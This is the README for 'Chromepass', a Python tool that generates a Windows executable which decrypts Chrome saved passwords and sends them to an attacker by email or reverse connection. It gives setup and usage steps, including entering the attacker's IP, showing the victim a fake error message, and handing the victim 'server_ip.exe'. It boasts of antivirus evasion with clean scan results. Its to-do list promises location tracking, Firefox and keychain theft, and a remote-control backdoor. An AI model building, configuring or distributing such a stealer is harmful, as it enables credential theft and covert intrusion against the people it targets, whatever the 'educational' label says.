## About The project
Chromepass is a python-based console application that generates a windows executable with the following features:

  - Decrypt Chrome saved paswords
  - Send a file with the login/password combinations remotely (email or reverse-http)
  - Custom icon
  - Completely undetectable by AntiVirus Engines

### AV Detection!
Due to the way this has been coded, it is currently fully undetected. Here are some links to scans performed using a variety of websites
  - [VirusTotal Scan](https://www.virustotal.com/gui/file/b4780b4712f494dc9856ff23ce29415445ad5eea3776663da28c556645f0e202/detection) (0/68) 30-09-2019
  	- this is an educational project, so distribution (or the lack thereof) is not a concern, hence the usage of VirusTotal
  - [AntiScan](https://antiscan.me/scan/new/result?id=kmpsMNccfuRJ) (0/26) 24-09-2019
  - [Hibrid Analysis](https://www.hybrid-analysis.com/sample/9ca69d2c60f0db6c09e9959b6f9c8bfdf66ddbe2e28f9f7539fd2856b62315c0) All Clean (CrowdStrike Falcon, MetaDefender and Virustotal) 24-09-2019  
	
## Getting started

### Dependencies and Requirements

This is a very simple application, which uses only:

* [Python] - Only tested on 3.7.4 but should work in 3.6+

### Installation

Chromepass requires [Python] 3.6+ to run.

Install the dependencies:

```powershell
> cd chromepass
> pip install -r requirements.txt
```

If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+ (preferably 3.7.4).
If the errors persist, try:
```powershell
> python -m pip install --upgrade pip
> python -m pip install -r requirements.txt
```  

## Usage

Chromepass is very straightforward. Start by running:
```powershell
> python create_server.py
```
It will ask you to select between two options:
*  **(1) via email**  _[_To be fixed_]_
    * This will ask you for an ***email*** address and a ***password***
    * It will then ask you if you wish to send to another address or to yourself
    * Next, you're asked if you want to display an error message. This is a fake message that if enabled will appear when the victim opens the executable, after the passwords have been transferred.
    * You can then write your own message or leave it blank
    * You're done! Wait for the executable to be generated and then it's ready.
    
*  **(2) via client.exe** _[Recommended at the moment]_
    * First you're asked to input an ***IP Address*** for a reverse connection. This is the address that belongs to the attacker. It can be a ***local IP address*** or a ***remote IP Address***. If a remote address is chosen, [Port Forwarding](https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/) needs to be in place.
    * You're then asked if you want to display an error message. This is a fake message that if enabled will appear when the victim opens the executable, after the passwords have been transferred.
    * You can then write your own message or leave it blank
    * You're done! Wait for the executables to be generated and then it's ready.
    * The **client.exe** must be started before the **server_ip.exe**. The **server_ip.exe** is the file the victim receives.
* Note: To set a custom icon, replace ***icon.ico*** by the desired icon with the same name and format.


## Todo
 - Sending Real-time precise location of the victim (***completed, releases next update***)
 - Also steal Firefox passwords (***Completed, releases next update***)
 - Option of installing a backdoor allowing remote control of the victim's computer (***completed, releases next update***)
 - Support for more email providers (***in progress***)
 - Also steal passwords from other programs, such as keychains(***in progress***)
 - Add Night Mode (***in progress***)
